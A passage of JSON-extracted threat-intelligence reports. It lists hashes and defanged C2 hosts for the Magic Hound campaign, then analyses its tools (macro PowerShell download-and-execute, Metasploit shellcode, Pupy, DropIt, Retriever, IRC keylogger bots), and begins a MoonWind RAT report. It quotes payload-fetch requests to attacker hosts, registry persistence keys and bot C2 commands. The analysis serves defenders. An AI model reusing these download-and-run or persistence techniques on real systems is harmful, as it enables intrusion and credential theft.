                "c21074f340665935e6afe2a972c8d1ab517954e2dd05cc73e5ff0e8df587b99d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ea139a73f8ec75ea60dfa87027c7c3ef4ed61b45e1acb5d1650cc54e658984ba"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "da2abdc951e4b2272fea5c8989debd22e26350bab4b4219104bccec5b8a7ff5a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0d3ae682868cb3ff069ec52e1ffc5ef765453fd78e47b6366d96aebb09afd8ab"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f0ecc4388f0d84501499711681a64a74c5d95e0bb6a2174cbe3744bd5a456396"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "860f4cd44371a180a99bc16526f54f8b051c420a3df334d05d569d0cdadac3d2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b42b1186211633c2d47f3d815f0371ba234fee2ed0f26e487badc58e1ab81061"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4beee6e7aa244335e161fdc05296ea100090c2114b4ff2e782e3ee3e1f936fdf"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5e0e09c9860b293c4c9a2382a7392963adc54d6a23440abb9a2d89c50f8fd305"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3161f9087d89a2d036ea32741d5a006c6bb279d36ff8d1acde63f2e354f8c502"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MagicHound.Fetch PE SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b6c159cad5a867895fd41c103455cebd361fc32d047b573321280b1451bf151c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6a7537f2cedbf453114cfba086e4746e698713777fb4fa4fc8964247dde741ed"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "16d87fbd8667677da1af5433b6d797438f8dc0ab565fb40ecb29f83f148888cd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "92bc7d04445cf67aa7ddf15792cd62778d2d774d06616d1986f4c389b3d463f5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "86d3409c908f667dd298b6a7e1e17652bb29af73e7daed4a5e945fbdf742e9f4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c3a8f5176351e87d28f45e58c79bb6646bb5d94ade7a24c6556514c860004143"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a390365ddfcce146a8fa8435022f19b9a1be29f2b11a049cb660ec53f36beb06"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d2ffc757a12817e4b58b3d58d71da951b177dedd3f65ca41fad04a03fc63fac6"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "79c9894b50cde62b182bd1560060c5c2bf5a1cef2b8afdffc4766e8c55ff6932"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2f7f3582504fbce349a6991fbb3b5f9577c5c014b6ce889b80d51977fa6fb31a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8c2e4aa8d73ad2e48d70dfa18abea62769c7bef59c8c1607720f4f6162413f75"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "abe8e86b787998a07411ee24f3f3d8a79e37c6da539650ceed566b081f968c26"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9e4d2e983f8a807f741f8873e6fa5d222dc6f3b358ccfc3a6c700398b342f656"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e57f77cc3d117923ec01aa0e044edc11b1042e57993ca7f74d971630893ca263"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ca6e823dedd6ca5fada2b1fa63d0acb288027f5a3cdd2c60dcace3c424c5ced0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "eaaecabb439c81e522d9f5681fdb047ee62381e763f0d9646e68cd507479ba5a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1c3e527e496c4b0594a403d6d582bc6db3029d27369720d0d5122f862b10d8f1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "29a659fb0ef0262e4de0dc3c6a140677b6ddee13c1819b791bd280be0547e309"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MagicHound.Fetch PE C2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "service.chrome-up[.]date"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "www3.chrome-up[.]date"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "www7.chrome-up[.]date"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "timezone[.]live"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "service1.chrome-up[.]date"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "104.238.184[.]252"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "www5.chrome-up[.]date"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "servicesystem.serveirc[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MagicHound.Fetch DOC SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "218fac3d0639c0d762fcf71685bcf6b64c33d1533df03b4cf223d9b07ca1e3c2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e5b643cb6ec30d0d0b458e3f2800609f260a5f15c4ac66faf4ebf384f7976df6"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "71e584e7e1fb3cf2689f549192fe3a82fd4cd8ee7c42c15d736ebad47b028087"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "388b26e22f75a723ce69ad820b61dd8b75e260d3c61d74ff21d2073c56ea565d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "33ee8a57e142e752a9c8960c4f38b5d3ff82bf17ec060e4114f5b15d22aa902e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5469facc266d5582bd387d69032a91c8fff373213b66a2f0852666e72bcdc1da"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "528714aaaa4a083e72599c32c18aa146db503eee80da236b20aea11aa43bdf62"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "66d24a529308d8ab7b27ddd43a6c2db84107b831257efb664044ec4437f9487b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cfce4827106c79a81eef6d3a0618c90bf5f15936036873573db76bed7e8a0864"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "68db2b363a88b061cc9063535f3920673f1f08d985b14cb52b898ced6c0f8964"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e837f6b814c09900726dac2cf55f41babf361152875ba2a765a34ee5cc496087"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f912d40de9fe9a726448c1d84dfba2d4941f57210b2dbc035f5d34d68e8ac143"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "af0ae0fa877f921d198239b7c722e12d14b2aa32fdfadaa37b47f558ae366de9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6d1a50ca3e80442fa3e2caca86c166ed60bef32c2d0af7352cd227303cdec031"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MagicHound.Fetch DOC C2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "45.76.128[.]165"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "139.59.46[.]154"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "104.218.120[.]128"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "89.107.62[.]39"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "69.87.223[.]26"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "analytics-google[.]org"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "89.107.60[.]11"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "www3.chrome-up[.]date"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "www.microsoftsubsystem.com-adm[.]in"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "www1.chrome-up[.]date"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MagicHound.Fetch XLS SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6c195ea18c05bbf091f09873ed9cd533ec7c8de7a831b85690e48290b579634b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "97943739ccf8a00036dd3cdd0ba48e17a82ab9b65cc22c17c6e6258e72bb9ade"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MagicHound.Fetch XLS C2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "45.76.128[.]165"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "139.59.46[.]154"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pupy Loaders SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7e57e35f8fce0efc3b944a7545736fa419e9888514fcd9e098c883b8d85e7e73"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "db453b8de1a01a3e4d963847c0a0a45fb7e1a9b9e6d291c8883c74019f2fc91f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "82779504d3fa0ffc8506ab69de9cb4d8f6415adbb11a9b8312828c539cf10190"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pupy Loaders C2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "139.59.46[.]154"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "www1.chrome-up[.]date"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MagicHound.Retriever SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1c550dc73b7a39b0cd21d3de7e6c26ece156253ac96f032efc0e7fcc6bc872ce"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7cdbf5c035a64cb6c7ee8c204ad42b4a507b1fde5e6708ea2486942d0d358823"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b2ea3fcd2bc493a5ac86e47029b076716ed22ef4487f9090f4aa1923a48015d6"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3f23972a0e80983351bedf6ad45ac8cd63669d3f1c76f8834c129a9e0418fff1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MagicHound.Retriever C2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "service.chrome-up[.]date"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "msservice[.]site"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "microsoftexplorerservices[.]cloud"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MagicHound.Leash SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "133959be8313a372f7a8d95762722a6ca02bc30aaffde0cbcf6ba402426d02f5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ba3560d3c789984ca29d80f0a2ea38a224e776087e0f28104569630f870adaf4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d8731a94d17e0740184910ec81ba703bad5ff7afc92ba056f200533f668e07bf"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MagicHound.Leash C2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "45.56.123[.]129"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "syn.timezone[.]live"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MPKBot SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d08d737fa59edbea4568100cf83cff7bf930087aaa640f1b4edf48eea4e07b19"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MPKBot C2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "45.58.37[.]142"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MAGICHOUND.ROLLOVER"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Magic Hound campaign used Word and Excel documents as a delivery method, specifically documents that contain a malicious macro that attempts to load either the Pupy RAT or possibly Meterpreter.",
                "We call this tool MagicHound.Rollover.",
                "In one example, the Word document contained a button with the label First click \"Enable Content\" above the page, then click here to fill out the form"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This string attempts to trick the user into enabling macros to execute the malicious code within the macro.",
                "When the macro executes, it unhides a table that contains the contents of a legitimate document in an attempt to make the user less suspicious of the malicious activities occurring in the background.",
                "The macro contains malicious code that attempts to download content from a remote server."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The macro uses PowerShell to download a shellcode-based payload from a remote server using one of two available techniques.",
                "The first technique is rather straightforward, using PowerShells \"iex\" function to execute a string obtained from a remote server.",
                "The macro carries out this first technique by running the following command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The code above generates the following HTTP request, which the C2 server would then respond to with a script that PowerShell would execute:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "GET /eiloShaegae1 HTTP/1.1\nHost: 139.59.46[.]154:3485\nConnection: Keep-Alive"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The second method involves using PowerShell to create a thread to execute a buffer of shellcode, which we believe the threat actors obtained from the Magic Unicorn source code.",
                "The Unicorn source code contains a comment for this specific PowerShell command, which is described as a one line shellcode injection with native x86 shellcode."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The shellcode begins with a stub that is responsible for decrypting additional shellcode.",
                "To decrypt the additional shellcode, the stub code will start with an initial key, such as 0x6CAF9362 and XOR the first DWORD of the additional shellcode.",
                "It will then add the resulting DWORD to the key that the stub code will use to decrypt the second DWORD and so on.",
                "After we decrypted the additional shellcode, we determined that the functional shellcode is part of the Metasploit Framework, specifically using the block_api.asm code to resolve API function names and the block_reverse_http.asm code to obtain additional shellcode to execute on the system.",
                "The assembly code used to create the shellcode can be obtained from:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_http.asm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The purpose of the shellcode is to obtain additional shellcode to execute using an HTTP request to the URL \"hxxp://45.76.128[.]165:4443/0w0O6\".",
                "We are unsure of the shellcode hosted at this URL, but it is possible that additional shellcode-based payloads like Meterpreter could have been served by this shellcode."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Two Rollover delivery documents (SHA256: 6c195ea18c05bbf091f09873ed9cd533ec7c8de7a831b85690e48290b579634b and SHA256: 218fac3d0639c0d762fcf71685bcf6b64c33d1533df03b4cf223d9b07ca1e3c2) attempted to communicate with the URL hxxp://139.59.46[.]154:3485/eiloShaegae1 to obtain additional code to execute.",
                "On January 1, 2017, we observed this URL responding to the above HTTP request with the following data:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As you can see, the C2 server responds with a PowerShell command that will run on the system.",
                "The PowerShell command decodes to the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The script above checks the system architecture to determine if it is an x64 machine and attempts to execute a base64 encoded command that decodes to the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This decoded PowerShell script attempts to download and execute a file using HTTP from the URL \"hxxp://",
                "139.59.46[.]154:3485 /IMo8oosieVai\".",
                "The C2 server will respond to this HTTP GET request with a large amount of data that includes a PowerShell script that also contains a DLL payload that is embedded as a series of base64 encoded chunks, that is then decoded using the following code:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The PowerShell script loads the DLL payload directly into memory without saving it to the disk.",
                "The Pupy payload was generated using the following configuration, which shows the C2 IP/port and the use of the \"obfs3\" transport:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It appears the adversary used a majority of the following Pupy module to create the PowerShell commands used in the delivery documents:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "https://github.com/n1nj4sec/Pupy/blob/master/Pupy/Pupylib/payloads/ps1_oneliner.py"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The custom loader Trojan used by this group, which we call MagicHound.Fetch is responsible for setting up persistent access to the system and to reach out to a remote server to download and execute a secondary payload.",
                "To set up persistence, the loader creates a folder named \"c:\\temp\", sets its attributes to be a hidden and system folder to hide the folder from view in Windows Explorer.",
                "It then writes a file named \"rr.exe\" (SHA256: f439dee4210d623b5aa7491bad8e8d9b43305f25a5d26940eb36f6460215cf8e) to this folder and executes it with specific command line arguments.",
                "During our analysis, we observed one loader running rr.exe with the following arguments:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The \"rr.exe\" payload dropped to the system does nothing more than use the supplied command line arguments to create a registry key to execute the payload each time the system starts.",
                "In the example above, the \"spp.exe\" executable would be added to an auto-run registry key at:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\iexplore"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Many of the Fetch samples attempted to obfuscate their functionality by encrypting their embedded strings with AES using the same key \"agkrhfpdbvhdhrkj\"; however, the loader's main goal involved running the following command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The base64 encoded command decodes to the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The decoded command above builds a buffer that it uses to store shellcode and creates a thread to execute it.",
                "We found the command above within the source code of Magic Unicorn, which was also used in the Magic Hound delivery documents.",
                "The shellcode executed by this command is the same as in the delivery documents as well, specifically taken from Metasploit to obtain additional shellcode to execute using an HTTP request to the following URL:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http://www7.chrome-up[.]date/0m5EE"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We are unsure of the shellcode hosted at this URL, as we were unable to coerce the C2 server to provide a payload.",
                "However, as alluded to above, we believe that this adversary used the open source Magic Unicorn tool to load a shellcode-based payload.",
                "The fact that the actor used Metasploit shellcode within the Unicorn generated PowerShell script leads us to speculate that the ultimate payload of this attack is Meterpreter, which is a shellcode-based payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pupy comes with default loaders that run the RAT on a variety of different platforms, specifically Windows, OSX, Linux and We have seen the Magic Hound actors using both the 32-bit and 64-bit DLL loaders that come with Pupy to infect Windows systems.",
                "We have gathered three samples of the default loader associated with this group and extracted the following configurations:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These configurations show that this group uses both fully-qualified domain names and IP addresses to host their Pupy C2 servers.",
                "Also, the configurations show the use of the obfs3 (The Threebfuscator) transport, which is an obfuscation method to hide the true TCP-based communications protocol.",
                "The obfs3 is used in the Tor project and the specifics of this transport can be found at the Tor Project."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Magic Hound campaign was also discovered using a custom dropper tool, which we have named MagicHound.DropIt."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The DropIt Trojan we analyzed is an executable that builds an embedded executable by decoding embedded blobs of base64 encoded data and concatenating them together in the correct order.",
                "In all of the DropIt samples we collected, the dropper will then save the executable to the users %TEMP% folder and execute the file, specifically to one of the following filenames:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We have also seen Magic Hound using DropIt like a binder Trojan, specifically dropping a legitimate decoy executable along with the malicious executable as a payload.",
                "For example, we analyzed a DropIt sample (SHA256: cca268c13885ad5751eb70371bbc9ce8c8795654fedb90d9e3886cbcfe323671) that dropped two executables, one of which was saved to %TEMP%\\flash_update.exe that was a legitimate Flash Player installer.",
                "We believe the Magic Hound campaign uses the DropIt Trojan to run legitimate applications that fit their social engineering, which in the example above included coercing the victim into updating their Flash Player."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We observed a DropIt sample installing another Trojan we call MagicHound.Retriever.",
                "At a high level, Retriever is a .NET downloader that downloads secondary payloads from servers associated with Magic Hound.",
                "While the Trojan itself does not resemble the other Magic Hound tools, it does create a folder named \"c:\\temp\" that the Magic Hound loader creates to store its persistence executable, as previously discussed.",
                "The folder name is quite generic and by itself is not a great correlation point, however, this coupled with the shared infrastructure makes a higher fidelity connection between the two."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Retriever Trojan uses the following namespace:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "using pcchekapp.grp.ammar.samaneh;"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Android.",
                "The malware begins by creating a web service object and uses the following URL within its configuration:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http:// service.chrome-up[.]date:8080 /WebService.asmx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It then calls a function called \"SetLog2\", which sets variables for the system's IP address, MAC address and hostname.",
                "A password variable is available but unused in this sample.",
                "The code will gather some information about the system, specifically the local IP address, MAC address, and the external IP address of the system.",
                "The code obtains the external IP address via an HTTP request using to http://checkip.dyndns.org/ and uses a regular expression to locate an IP address from the HTTP response."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once these variables are set, the malware uses the SoapHttpClientProtocol class to communicate with its C2 server, which issues an HTTP POST requests that appears as:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As you can see from the above request, the SoapHttpClientProtocol class neatly structures data into an HTTP POST request.",
                "All subsequent interaction with the C2 server uses the same SOAP web service, so we will not show all of the generated HTTP requests.",
                "Instead, we will refer to the specific SOAP action (see \"SOAPAction\" field in previous example, specifically \"SetLog2\") that the Trojan requests from the C2 server and the response from the C2 server.",
                "After sending the C2 the system information, the malware then issues a second request for \"GetHasAnything\", which will communicate with the C2 server and ask the server if it has a secondary binary for the Trojan to install."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the C2 server provides any response to the \"GetHasAnything\" request, it then calls the \"GetIdAbOne\" SOAP method to obtain what we believe is a unique identifier for the system that the Trojan will use for further interaction with the C2.",
                "After receiving this variable, the Trojan calls the \"GetNameAbById\" to obtain a base64 string that will be the filename written in a newly created \"c:\\temp\" (decoded from \"YzpcdGVtcFw=\") folder.",
                "The Trojan will then call \"GetAbById\", which the C2 will provide a base64 string for the contents for the file to write to c:\\temp.",
                "After obtaining the unique ID from the C2 server, the Trojan calls the \"SetAbStatById\" method to notify the C2 server of its status of \"1\" to notify the server it had successfully received the filename and file data."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "With the file written to the system, the Trojan calls the \"GetishideAbById\" SOAP action to determine whether or not the C2 server wishes to execute the newly dropped file in a hidden window.",
                "This request is followed by a call to \"GetisrunasAbById\" to determine if the Trojan should use \"runas\" to execute the downloaded executable with elevated privileges, which would display the UAC dialog for the user to click."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unfortunately, we were unable to obtain a secondary payload from an active C2 server."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Magic Hound campaign was also discovered deploying an IRC Bot, which we have named MagicHound.Leash.",
                "This tool was discovered when we observed a DropIt sample installing a backdoor Trojan that used IRC for its C2 communications.",
                "The bot chooses a random name from 977 hardcoded possibilities, connects to an adversary owned IRC server and joins a channel using the following IRC commands:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "USER AS_a # # :des\nNICK Conroy\nJOIN :#kalk"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Leash obtains its commands via private messages (PRIVMSG) sent from the adversary who must also be connected to the IRC server.",
                "The following commands are available:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "All of the commands, except for the VER command, must be issued by individuals in the IRC channel with nicknames that start with \"AS_\" or \"AF_",
                "\".",
                "This suggests that the adversarys IRC nickname would need to have these prefixes to control the systems infected with this Trojan.",
                "The adversary could have used this name requirement as an added measure to make sure other individuals did not join the IRC server and begin interacting with compromised systems."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We also found a second IRC bot called MPK (SHA256: d08d737fa59edbea4568100cf83cff7bf930087aaa640f1b4edf48eea4e07b19) using an IP that a Retriever sample was hosted on as a C2 server instead.",
                "This MPK IRC bot is very similar to the MPK Trojan that used a custom C2 communications protocol, as discussed in the whitepaper by CheckPoint discussing a threat group called Rocket Kitten.",
                "We believe this version of the MPK Trojan is based on the same code base, as both the IRC version and the one discussed in the above white paper have considerable similarities from a behavior standpoint and both Trojan have direct code sharing between them."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "From a behaviorial standpoint, both the IRC and custom protocol version of MPK save \"tmp.vbs\" and \"tmp1.vbs\" to the %TEMP% folder (both differed slightly but used the same variable names within the script) in order to copy the Trojan to its final location and to execute it.",
                "Both variants need to be executed with the command line argument \"[2]\" to avoid continually attempting to copy and execute the Trojan using the tmp.vbs and tmp1.vbs files.",
                "The two variants of MPK share the same registry key that the Trojan uses to automatically run each time the system starts, specifically:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "[HKLM and HKCU]\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\explorer"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Both MPK variants include key loggers that are extremely similar in functionality in addition to having the same strings used for headers within the key log file.",
                "The MPK IRC Bot monitors active application windows and writes the title of the open window along with the logged keystrokes to a file at %temp%\\Save.tmp.",
                "The MPK Trojan also monitors specifically for windows that are likely to contain login forms for popular web-based email clients, such as titles that contain:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\"Gmail -\"\n\"Yahoo - login\"\n\"Sign In -\"\nOutlook.com -\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MPK will attempt to parse these window titles to identify the associated email address and record these to the log file using the following format:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "/////////////\nMail Find <email address>\n///////////"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the Trojan does not find the window titles associated with Gmail, Yahoo or Outlook, it saves the title to the \"Save.tmp\" file in the following format:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "+++++++++++++\nWindow= <window title>\n+++++++++++++"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The major difference between the IRC variant and non-IRC variant of MPK is the C2 protocol used.",
                "The IRC variant creates a mutex named mpk1 and attempts to connect to an IRC server at 45.58.37[.]142:6667.",
                "The MPK bot generates a random lowercase name and uses it to log into the IRC server.",
                "It then sends the following IRC commands:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "NICK bxphzrjbxp\nUSER bxphzrjbxp bxphzrjbxp bxphzrjbxp bxphzrjbxp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To make sure it connected to the correct server, the Trojan checks for the message sent from the IRC server after the bot connects:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Welcome to the MpkNet IRC Network"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The MPK bot does not join a specific IRC channel, instead sending private messages (PRIVMSG) to a user with the nick \"mpk\".",
                "After connecting to the IRC server, the MPK bot sends custom ping messages and provides an introduction via a !",
                "Hello message that contains the current logged in user of the infected host, if the user has administrator privileges, the hostname, the UUID of the system, and operating system version.",
                "Figure 7 shows the initial private messages sent from the MPK bot to the mpk account on the C2 server."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7 Initial private messages sent from MPK to the IRC C2 server"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The commands available within the MPK IRC bot are called via a jump table, rather than a switch statement used in the custom protocol variant of MPK.",
                "The IRC variant of MPK has a command set (Table 2) that makes this an effective backdoor Trojan, specifically allowing the actors to steal credentials from the targeted system via keylogging, to navigate and interact with the file system, to run arbitrary commands, and to download and execute additional tools on the system."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2 Commands available within MPK IRC Bot"
            ]
        }
    ],
    "bedbe08ada82830c5dff0e039e0854871744ef1c": [
        {
            "type": "paragraph",
            "content": [
                "From September 2016 through late November 2016, a threat actor group used both the Trochilus RAT and a newly idenfied RAT weve named MoonWind to target organizations in Thailand, including a utility organization.",
                "We chose the name MoonWind based on debugging strings we saw within the samples, as well as the compiler used to generate the samples.",
                "The attackers compromised two legitimate Thai websites to host the malware, which is a tactic this group has used in the past.",
                "Both the Trochilus and MoonWind RATs were hosted on the same compromised sites and used to target the same organization at the same time.",
                "The attackers used different command and control servers (C2s) for each malware family, a tactic we believe was meant to thwart attempts to tie the attacks together using infrastructure alone.",
                "The compromised websites are the site for a group of information technology companies in Thailand, and all the tools were stored in the same directory."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We were also able to find a post-compromise tool along with the two RATs, which afforeded us insight into one of the tools the attackers used once they gained a foothold inside an organization.",
                "In addition to Trochilus and MoonWind we found Mimikatz, a popular credential harvesting tool."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Further research led us to additional MoonWind samples using the same C2 (dns[.] webswindows [.]com) but hosted on a different compromised but legitimate website.",
                "The attacks in that case took place in late September to early October 2016 and the attackers stored the MoonWind samples as RAR files, while in the November attacks the RATs were stored as executables.",
                "We were not able to find additional tools, but the attackers again compromised a legitimate Thai website to host their malware, in this case the student portal for a Thai University."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The MoonWind sample used for this analysis was compiled with a Chinese compiler known as BlackMoon, the same compiler used for the BlackMoon banking Trojan.",
                "While a number of attributes match the BlackMoon banking Trojan, the malware is not the same.",
                "Both malware families were simply compiled using the same compiler, and it was the BlackMoon artifacts that resulted in the naming of the BlackMoon banking Trojan.",
                "But because this new sample is different from the BlackMoon banking Trojan, we have named it MoonWind, by combining the BlackMoon compiler artifacts with the embedded string below:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "E:\\StarWind\\FW__Project_RTPD-PIBICs\\Table.ini"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When MoonWind first runs, it will copy itself to one of the following locations with a filename of svcohos.exe:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It then executes a new instance of itself in a new process.",
                "Also, it will remove the original file via the following command that is executed in a batch script named 'date.bat."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During this routine, a randomly generated victim identifier will be created and written to a file named 'micr.ini'.",
                "This file is located in the same path as the malware.",
                "The following contents represent an example of a victim ID contained in this file:"
            ]
        },
